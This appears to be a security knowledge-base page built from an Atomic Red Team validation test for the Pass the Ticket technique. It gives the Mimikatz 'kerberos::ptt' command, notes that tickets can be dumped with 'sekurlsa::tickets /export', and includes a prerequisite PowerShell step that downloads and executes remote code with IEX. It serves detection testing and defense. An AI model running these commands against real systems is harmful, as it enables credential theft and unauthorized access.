---
atomic_guid: "dbf38128-7ba7-4776-bedf-cc2eed432098"
title: "Mimikatz Kerberos Ticket Attack"
framework: "atomic"
generated: "true"
attack_technique_id: "T1550.003"
attack_technique_name: "Use Alternate Authentication Material: Pass the Ticket"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1550.003/T1550.003.yaml"
build_date: "2026-04-26 17:02:13"
executor: "command_prompt"
aliases:
  - "dbf38128-7ba7-4776-bedf-cc2eed432098"
  - "Mimikatz Kerberos Ticket Attack"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Mimikatz Kerberos Ticket Attack

Similar to PTH, but attacking Kerberos

## Metadata

- Atomic GUID: dbf38128-7ba7-4776-bedf-cc2eed432098
- Technique: T1550.003: Use Alternate Authentication Material: Pass the Ticket
- Platforms: windows
- Executor: command_prompt
- Dependency Executor: powershell
- Source Path: atomics/T1550.003/T1550.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1550-use_alternate_authentication_material|T1550.003]]

## Input Arguments

### mimikatz_exe

- description: Path of the Mimikatz binary
- type: path
- default: PathToAtomicsFolder\..\ExternalPayloads\bin\x64\mimikatz.exe

### ticket

- description: Ticket file name usually format of 'id-username\@domain.kirbi' (e.g. can be dumped by "sekurlsa::tickets /export" module)
- type: string

## Dependencies

Mimikatz must exist on disk at specified location (#{mimikatz_exe})

### Prerequisite Check

```powershell
if (Test-Path "#{mimikatz_exe}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1" -UseBasicParsing) 
$releases = "https://api.github.com/repos/gentilkiwi/mimikatz/releases"
$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(".zip") }
$basePath = Split-Path "#{mimikatz_exe}" | Split-Path
Invoke-FetchFromZip $zipUrl "x64/mimikatz.exe" $basePath
```

## Executor

- name: command_prompt

### Command

```cmd
"#{mimikatz_exe}" "kerberos::ptt #{ticket}"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1550.003/T1550.003.yaml)
